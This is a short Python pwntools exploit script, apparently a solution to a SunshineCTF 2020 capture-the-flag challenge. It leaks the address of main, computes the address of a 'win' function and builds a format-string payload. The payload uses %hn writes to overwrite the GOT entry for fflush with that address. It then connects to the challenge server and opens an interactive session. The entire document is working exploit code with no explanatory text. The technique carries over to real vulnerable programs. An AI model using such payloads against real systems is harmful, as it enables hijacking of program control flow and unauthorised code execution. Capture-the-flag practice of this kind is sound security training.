from pwn import *

sh = remote('chal.2020.sunshinectf.org', 30012)
# sh = process('./chall_12')

p1 = 'abc'

s = sh.recvline().decode('ascii').split()
main_addr = int(s[-1], 0)
print('main:', hex(main_addr))
win = main_addr - 0x8c
print('win:', hex(win))

win1 = win & 0xffff
win2 = (win & 0xffff0000) >> (4 * 4)

# [0x565569fc] fflush@GLIBC_2.0 -> 0xf7e39350 (fflush) ◂— push   ebp
fflush = main_addr + 0x13c3
print('fflush:', hex(fflush))

fflush1 = fflush
fflush2 = fflush1 + 2

payload = b'AAAA' + p32(fflush2) + p32(fflush1)
n_sent = len(payload)

payload += "%{}x".format(win2 - n_sent).encode() + b'%7$hn'
n_sent = win2

payload += "%{}x".format(win1 - n_sent).encode() + b'%8$hn'

print(payload)

with open('payload', 'w') as f:
    f.write(p1 + '\n')

with open('payload', 'ab') as f:
    f.write(payload)

sh.sendline(p1)

sh.sendline(payload)
sh.interactive()
